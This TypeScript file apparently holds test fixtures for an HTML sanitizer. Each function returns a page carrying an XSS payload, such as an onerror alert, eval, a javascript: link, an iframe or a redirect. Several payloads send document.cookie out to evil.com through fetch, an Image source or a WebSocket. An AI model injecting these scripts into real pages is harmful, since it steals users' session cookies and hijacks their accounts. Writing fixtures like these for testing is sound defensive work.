export function xssEventHandler(): string {
  return `<html><body><img src="x" onerror="alert('xss')"><p>Test</p></body></html>`;
}

export function xssFetch(): string {
  return `
    <html><body>
      <p>Content</p>
      <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
    </body></html>
  `;
}

export function xssEval(): string {
  return `
    <html><body>
      <p>Content</p>
      <script>eval('alert(document.cookie)')</script>
    </body></html>
  `;
}

export function xssWebSocket(): string {
  return `
    <html><body>
      <p>Content</p>
      <script>new WebSocket('ws://evil.com/exfiltrate')</script>
    </body></html>
  `;
}

export function xssLocationRedirect(): string {
  return `
    <html><body>
      <p>Content</p>
      <script>window.location = 'https://evil.com'</script>
    </body></html>
  `;
}

export function xssImageExfiltration(): string {
  return `
    <html><body>
      <p>Content</p>
      <script>new Image().src = 'https://evil.com/?data=' + document.cookie</script>
    </body></html>
  `;
}

export function xssIframe(): string {
  return `<html><body><iframe src="https://evil.com"></iframe><p>Test</p></body></html>`;
}

export function xssJavascriptProtocol(): string {
  return `<html><body><a href="javascript:alert(1)">Click</a><p>Test</p></body></html>`;
}
